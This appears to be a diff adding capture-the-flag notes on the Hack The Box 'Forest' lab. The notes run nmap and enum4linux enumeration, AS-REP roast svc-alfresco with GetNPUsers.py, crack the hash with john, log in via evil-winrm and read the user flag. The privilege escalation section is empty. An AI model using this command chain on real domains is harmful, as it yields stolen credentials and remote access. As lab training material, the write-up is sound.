@@ -1,0 +1,115 @@
+I start off with an nmap scan:
+└─# nmap -sC -sV -A 10.10.10.161
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain       Simple DNS Plus
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-06-09 20:51:35Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+
+Host script results:
+|_clock-skew: mean: 2h28m37s, deviation: 4h02m29s, median: 8m36s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2021-06-09T13:52:19-07:00
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-06-09T20:52:23
+|_  start_date: 2021-06-09T20:49:35
+--------------------------------------------------------------
+enum4linux 10.10.10.161
+
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+
+[+] Getting builtin groups:
+group:[Account Operators] rid:[0x224]
+group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
+group:[Incoming Forest Trust Builders] rid:[0x22d]
+group:[Windows Authorization Access Group] rid:[0x230]
+group:[Terminal Server License Servers] rid:[0x231]
+group:[Administrators] rid:[0x220]
+group:[Users] rid:[0x221]
+group:[Guests] rid:[0x222]
+group:[Print Operators] rid:[0x226]
+group:[Backup Operators] rid:[0x227]
+group:[Replicator] rid:[0x228]
+group:[Remote Desktop Users] rid:[0x22b]
+group:[Network Configuration Operators] rid:[0x22c]
+group:[Performance Monitor Users] rid:[0x22e]
+group:[Performance Log Users] rid:[0x22f]
+group:[Distributed COM Users] rid:[0x232]
+group:[IIS_IUSRS] rid:[0x238]
+group:[Cryptographic Operators] rid:[0x239]
+group:[Event Log Readers] rid:[0x23d]
+group:[Certificate Service DCOM Access] rid:[0x23e]
+group:[RDS Remote Access Servers] rid:[0x23f]
+group:[RDS Endpoint Servers] rid:[0x240]
+group:[RDS Management Servers] rid:[0x241]
+group:[Hyper-V Administrators] rid:[0x242]
+group:[Access Control Assistance Operators] rid:[0x243]
+group:[Remote Management Users] rid:[0x244]
+group:[System Managed Accounts Group] rid:[0x245]
+group:[Storage Replica Administrators] rid:[0x246]
+group:[Server Operators] rid:[0x225]
+
+-----------
+GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.10.10.161
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:79d9b20783fb8c2b3f4e1bd1fb317b26$f74ca7d9e3fa64d05e0dfd42f41682f99a2294c7e1f09354f2a120103dabecc7f781fd4b2715877cb0ced866a2c30167548015eb57d889853069cc55842efa9856a8f1087167b043c0384577babf833c37947940ccf72ca383a74dd2dd2466f6d4875c625d888eb18174c7f0ceec4d8b0f3cdf5f42b41e306442640f80590ac4a35a55fce45bd197be3a6303a4fe958214929497c343660c230ffeff14d90610cc6d7446684f55d5d6a231703261b89572eb5b4729a5a904f76d93b64a8cf9dc764fa7078c08c28e057aba55a2fc8b809148bd4b8491acca26c62118155a6ce0ad585f85df88
+
+└─# john -w=/usr/share/wordlists/rockyou.txt alfresco.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
+
+svc-alfresco : s3rvice 
+└─# nmap -p 5985 10.10.10.161
+Nmap scan report for forest.htb (10.10.10.161)
+PORT     STATE SERVICE
+5985/tcp open  wsman
+
+└─# evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> dir
+
+    Directory: C:\Users\svc-alfresco\desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        9/23/2019   2:16 PM             32 user.txt
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> type user.txt
+e5e4e47ae7022664cda6eb013fb0d9ed
+
+=====================================================
+Privelege Escalation
+=====================================================
+
+
